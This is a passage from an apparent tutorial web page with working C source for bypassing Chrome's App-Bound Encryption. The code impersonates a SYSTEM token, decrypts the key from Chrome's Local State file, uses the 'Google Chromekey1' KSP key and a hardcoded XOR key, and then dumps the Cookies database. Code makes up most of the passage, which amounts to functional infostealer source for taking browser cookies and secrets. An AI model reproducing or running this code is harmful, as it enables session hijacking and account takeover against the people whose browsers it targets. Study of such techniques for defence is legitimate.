    LocalState <span class="token operator">=</span> <span class="token function">ReadFileContents</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span>L<span class="token string">"Google\\Chrome\\User Data\\Local State"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>LocalState <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    Result <span class="token operator">=</span> <span class="token function">ExtractAppBoundKey</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PSTR<span class="token punctuation">)</span>LocalState<span class="token punctuation">,</span> AppBoundKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> LocalState<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
	
	<span class="token comment">//</span>
	<span class="token comment">// SNIP ---------------------</span>
	<span class="token comment">//</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-9">The ExtractAppBoundKey Function</h4>
<p>The <code>ExtractAppBoundKey</code> function is responsible for 
extracting the encrypted app-bound key from the local state JSON file 
and decrypting it. It takes two parameters:</p>
<ul>
<li>
<p><code>LocalState</code> - The contents of the local state JSON file.</p>
</li>
<li>
<p><code>DecryptedKey</code> - A buffer that will receive the decrypted app-bound key.</p>
</li>
</ul>
<p>The function begins by using <code>strstr</code> to locate the <code>app_bound_encrypted_key</code>
 attribute in the JSON. This attributes value is a structure that 
describes the encrypted app-bound key, which we will call the <em>key descriptor</em>. Because this value is base-64 encoded, we need to decode it first using the <code>Base64Decode</code> helper from the Firefox modules. Before moving forward, lets take a closer look at the format of the key descriptor:</p>
<img src="81_files/AppBoundKey.png" style="margin:auto" width="1000px">
<p>The descriptor begins with an <code>APPB</code> header, which is followed by verification data. Because everything after the header is encrypted,</p>
<p>This verification data contains the path to the Chrome installation and is required because everything after the <code>APPB</code>
 header is encrypted using a method we will explain soon. After the 
verification data, there is an AES-256-GCM key, tag and nonce which were
 used to encrypt the app-bound key found between the nonce and the tag.</p>
<p>With this in mind, we skip the <code>APPB</code> header and call <code>DecryptAppBoundKey</code> to decrypt the key descriptor. The function will use the decrypted key descriptor to decrypt the app-bound key itself.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">PUCHAR <span class="token function">Base64Decode</span><span class="token punctuation">(</span>_In_ PSTR EncodedBuffer<span class="token punctuation">,</span> _In_ ULONG EncodedBufferSize<span class="token punctuation">,</span> _Inout_ PULONG DecodedBufferSize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    PUCHAR  DecodedBuffer<span class="token punctuation">;</span>
    BOOLEAN Result<span class="token punctuation">;</span>
    
    Result <span class="token operator">=</span> <span class="token function">CryptStringToBinaryA</span><span class="token punctuation">(</span>EncodedBuffer<span class="token punctuation">,</span> EncodedBufferSize<span class="token punctuation">,</span> CRYPT_STRING_BASE64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> DecodedBufferSize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not calculate the size of the base64 decoded AppBound key: 0x%08lX\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    DecodedBuffer <span class="token operator">=</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span>DecodedBufferSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>DecodedBuffer <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    Result <span class="token operator">=</span> <span class="token function">CryptStringToBinaryA</span><span class="token punctuation">(</span>EncodedBuffer<span class="token punctuation">,</span> EncodedBufferSize<span class="token punctuation">,</span> CRYPT_STRING_BASE64<span class="token punctuation">,</span> DecodedBuffer<span class="token punctuation">,</span> DecodedBufferSize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not base64 decode the AppBound key: 0x%08lX\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> DecodedBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> DecodedBuffer<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

CONST CHAR kCryptAppBoundKeyPrefix<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token char">'P'</span><span class="token punctuation">,</span> <span class="token char">'P'</span><span class="token punctuation">,</span> <span class="token char">'B'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

BOOLEAN <span class="token function">ExtractAppBoundKey</span><span class="token punctuation">(</span>_In_ PSTR LocalState<span class="token punctuation">,</span> _Out_ PUCHAR DecryptedKey<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    PSTR    AppBoundKey<span class="token punctuation">;</span>
    BOOLEAN Result<span class="token punctuation">;</span>
    PUCHAR  DecodedKey<span class="token punctuation">;</span>
    ULONG   KeySize<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Look for "app_bound_encrypted_key" property in the JSON</span>
    <span class="token comment">//</span>

    AppBoundKey <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>LocalState<span class="token punctuation">,</span> <span class="token string">"app_bound_encrypted_key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>AppBoundKey <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not find the AppBound key in the local state file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Skip over the "app_bound_encrypted_key:" to get the base64 encoded key</span>
    <span class="token comment">//</span>

    AppBoundKey <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token string">"\"app_bound_encrypted_key\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    KeySize <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>AppBoundKey<span class="token punctuation">,</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token operator">-</span> AppBoundKey<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Base64 decode the key</span>
    <span class="token comment">//</span>

    DecodedKey <span class="token operator">=</span> <span class="token function">Base64Decode</span><span class="token punctuation">(</span>AppBoundKey<span class="token punctuation">,</span> KeySize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeySize<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>DecodedKey <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Decrypt the key</span>
    <span class="token comment">//</span>

    Result <span class="token operator">=</span> <span class="token function">DecryptAppBoundKey</span><span class="token punctuation">(</span>DecodedKey <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>kCryptAppBoundKeyPrefix<span class="token punctuation">)</span><span class="token punctuation">,</span> KeySize <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>kCryptAppBoundKeyPrefix<span class="token punctuation">)</span><span class="token punctuation">,</span> DecryptedKey<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Skip over the key's header ("APPB")</span>
    <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> DecodedKey<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> Result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-10">The DecryptAppBoundKey Function</h4>
<p><code>DecryptAppBoundKey</code> is the function we use to decrypt the
 key descriptor, and in turn the app-bound key itself. It encapsulates 
the process performed by the Chrome Elevation Service. It takes in three
 parameters:</p>
<ul>
<li><code>AppBoundKey</code> - The key descriptor.</li>
<li><code>AppBoundKeySize</code> - The size of the key descriptor.</li>
<li><code>DecryptedKey</code> - A buffer which will receive the decrypted app-bound key.</li>
</ul>
<p>First, it obtains a handle to the token of a system process using the previously created <code>GetSystemToken</code> helper. Using this token, it impersonates the <code>SYSTEM</code> user and calls <code>CryptUnprotectData</code> on the key descriptor, removing the first layer of encryption. Recall that data encrypted using <code>CryptProtectData</code> is tied to the user who encrypted it. This is one of the reasons why we need to run as the <code>SYSTEM</code> user in order to mimic the decryption process.</p>
<p>Moving on to the next encryption layer, we need to stop impersonating <code>SYSTEM</code> by calling the <code>RevertToSelf</code> function. This will allow us to decrypt the key descriptor using the <code>CryptProtectData</code> function, but this time as the user. At this point, the key descriptor has been decrypted.</p>
<p>We skip the verification data and extract the AES-256-GCM key, nonce,
 and the encrypted app-bound key. Unfortunately, the AES key itself is 
under two layers of encryption which we must remove in order to decrypt 
the app-bound key.</p>
<p>To remove the first layer of encryption, we use a special cryptographic key called <code>Google Chromekey1</code>, which is stored in the Microsoft Software Key Storage Provider. This key can only be accessed by the <code>SYSTEM</code> user, so we must impersonate the system token again. The helper function <code>DecryptUsingChromeKey</code> handles this step and will be explained later. After decrypting with <code>Google Chromekey1</code>, the AES key is XOR-ed it with a fixed key to complete the key derivation.</p>
<p>Finally, the fully decrypted AES key is used to decrypt the app-bound
 key using AES-256-GCM. If the decryption is successful, the resulting 
app-bound key is copied into the <code>DecryptedKey</code> output buffer. At this point, we have everything we need to decrypt Chrome secrets.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CONST UCHAR XorKey<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x90</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

BOOLEAN <span class="token function">DecryptAppBoundKey</span><span class="token punctuation">(</span>_In_ PUCHAR AppBoundKey<span class="token punctuation">,</span> _In_ ULONG AppBoundKeySize<span class="token punctuation">,</span> _Out_ PUCHAR DecryptedKey<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    DATA_BLOB EncryptedKey<span class="token punctuation">;</span>
    DATA_BLOB UserKey<span class="token punctuation">;</span>
    DATA_BLOB Key <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    PUCHAR    AesKey<span class="token punctuation">;</span>
    PUCHAR    Nonce<span class="token punctuation">;</span>
    PUCHAR    Ciphertext<span class="token punctuation">;</span>
    PUCHAR    Tag<span class="token punctuation">;</span>
    BOOLEAN   Result<span class="token punctuation">;</span>
    HANDLE    SystemToken<span class="token punctuation">;</span>

    SystemToken <span class="token operator">=</span> <span class="token function">GetSystemToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>SystemToken <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//</span>
        <span class="token comment">// Decrypt the data as SYSTEM</span>
        <span class="token comment">//</span>

        Result <span class="token operator">=</span> <span class="token function">ImpersonateLoggedOnUser</span><span class="token punctuation">(</span>SystemToken<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        EncryptedKey<span class="token punctuation">.</span>pbData <span class="token operator">=</span> AppBoundKey<span class="token punctuation">;</span>
        EncryptedKey<span class="token punctuation">.</span>cbData <span class="token operator">=</span> AppBoundKeySize<span class="token punctuation">;</span>

        Result <span class="token operator">=</span> <span class="token function">CryptUnprotectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>EncryptedKey<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">RevertToSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not decrypt the app-bound key as SYSTEM\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//</span>
        <span class="token comment">// Decrypt the data as the user</span>
        <span class="token comment">//</span>

        Result <span class="token operator">=</span> <span class="token function">CryptUnprotectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserKey<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">LocalFree</span><span class="token punctuation">(</span>UserKey<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not decrypt the app-bound key as the Chrome user\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//</span>
        <span class="token comment">// Skip over the verification data and get the (encrypted) AES key used to encrypt the app-bound key</span>
        <span class="token comment">//</span>

        AesKey <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span>Key<span class="token punctuation">.</span>pbData <span class="token operator">+</span> <span class="token punctuation">(</span>Key<span class="token punctuation">.</span>pbData <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        Nonce <span class="token operator">=</span> AesKey <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>         <span class="token comment">// AES-256-GCM nonce used when encrypting the app-bound key</span>
        Ciphertext <span class="token operator">=</span> Nonce <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">;</span>     <span class="token comment">// Encrypted app-bound key</span>
        Tag <span class="token operator">=</span> Ciphertext <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>       <span class="token comment">// AES-256-GCM tag used when encrypting the app-bound key</span>

        <span class="token comment">//</span>
        <span class="token comment">// Decrypt the AES key using Chrome's CNG. We also need to be system to access it.</span>
        <span class="token comment">//</span>
        
        Result <span class="token operator">=</span> <span class="token function">ImpersonateLoggedOnUser</span><span class="token punctuation">(</span>SystemToken<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Result <span class="token operator">=</span> <span class="token function">DecryptUsingChromeKey</span><span class="token punctuation">(</span>AesKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">RevertToSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>UCHAR Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            AesKey<span class="token punctuation">[</span>Index<span class="token punctuation">]</span> <span class="token operator">^=</span> XorKey<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//</span>
        <span class="token comment">// Use the decrypted AES key to decrypt the app-bound key</span>
        <span class="token comment">//</span>

        Result <span class="token operator">=</span> <span class="token function">Aes256GcmDecrypt</span><span class="token punctuation">(</span>AesKey<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> Nonce<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> Tag<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> TRUE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>DecryptedKey<span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Key<span class="token punctuation">.</span>pbData <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">LocalFree</span><span class="token punctuation">(</span>Key<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>SystemToken<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-11">The DecryptUsingChromeKey Function</h4>
<p>The <code>DecryptUsingChromeKey</code> function is used to decrypt 
the 32-byte AES-256-GCM key using the Chrome key stored in the Microsoft
 Key Storage Provider (KSP). The KSP API allows applications to easily 
manage cryptographic keys in a secure manner. Since the Chrome key is 
stored in the system KSP, we need to run as the <code>SYSTEM</code> user in order to access it.</p>
<p>First, the function opens the Microsoft KSP using <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptopenstorageprovider" target="_blank">NCryptOpenStorageProvider</a>, and then it opens the <code>Google Chromekey1</code> key from this provider using <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptopenkey" target="_blank">NCryptOpenKey</a>. If the key is opened successfully, the function calls <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptdecrypt" target="_blank">NCryptDecrypt</a> to decrypt the 32-byte ciphertext in place using the opened key.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOLEAN <span class="token function">DecryptUsingChromeKey</span><span class="token punctuation">(</span>_In_ PUCHAR Ciphertext<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    NCRYPT_PROV_HANDLE ProviderHandle<span class="token punctuation">;</span>
    NCRYPT_KEY_HANDLE  KeyHandle<span class="token punctuation">;</span>
    ULONG              BytesDecrypted<span class="token punctuation">;</span>
    SECURITY_STATUS    Status<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open the storage provider</span>
    <span class="token comment">//</span>

    Status <span class="token operator">=</span> <span class="token function">NCryptOpenStorageProvider</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ProviderHandle<span class="token punctuation">,</span> L<span class="token string">"Microsoft Software Key Storage Provider"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Status <span class="token operator">!=</span> ERROR_SUCCESS<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open key storage provider: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open the Chrome key from the storage provider</span>
    <span class="token comment">//</span>

    Status <span class="token operator">=</span> <span class="token function">NCryptOpenKey</span><span class="token punctuation">(</span>ProviderHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyHandle<span class="token punctuation">,</span> L<span class="token string">"Google Chromekey1"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Status <span class="token operator">!=</span> ERROR_SUCCESS<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open the Google Chromekey1 key: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">NCryptFreeObject</span><span class="token punctuation">(</span>ProviderHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Decrypt the ciphertext</span>
    <span class="token comment">//</span>
    
    Status <span class="token operator">=</span> <span class="token function">NCryptDecrypt</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Ciphertext<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>BytesDecrypted<span class="token punctuation">,</span> NCRYPT_SILENT_FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">NCryptFreeObject</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">NCryptFreeObject</span><span class="token punctuation">(</span>ProviderHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Status <span class="token operator">!=</span> ERROR_SUCCESS<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Failed decrypting the app-bound key using the Chromekey1 key: 0x%08lX\n"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-12">Dumping Chrome Cookies</h3>
<p>Equipped with the app-bound key, we can dump Chrome's cookies using the <code>DumpChromeCookies</code> function, which takes in a single parameter, <code>AppBoundKey</code>, which is the AES key used to encrypt Chrome secrets.</p>
<p>The function starts by using the SQLite API to open a handle to the database in which Chrome stores cookies, found at <code>Google\Chrome\User Data\Default\Network\Cookies</code>.
 Then, it will execute a SQL query that pulls key cookie attributes, 
including host, path, name, expiration time in local date-time format, 
the encrypted cookie data, and its length.</p>
<p>Once the query has finished executing, the SQLite API will call the <code>CookiesSqlCallback</code>
 callback, which will print all this data to the console. The cookie's 
value will be decrypted and printed using the previously created <code>PrintChromeSecret</code> function. As the length of the cookie's value is provided as the fifth parameter in string format, we must use the <code>strotoul</code> function to convert it to an integer.</p>
